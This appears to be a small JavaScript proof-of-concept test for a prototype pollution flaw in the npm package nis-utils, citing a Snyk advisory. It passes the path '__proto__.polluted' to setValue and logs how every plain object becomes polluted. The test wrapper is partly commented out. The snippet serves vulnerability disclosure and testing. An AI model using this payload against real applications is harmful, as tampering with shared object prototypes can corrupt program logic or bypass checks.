// //https://snyk.io/vuln/SNYK-JS-NISUTILS-598799

// test("prototype pollution in nis-utils", () => {
  const nisUtils = require("nis-utils");

  const object1 = {};
console.log({}.polluted);

  nisUtils.object.setValue({}, "__proto__.polluted", "yes");
console.log({}.polluted);
// });
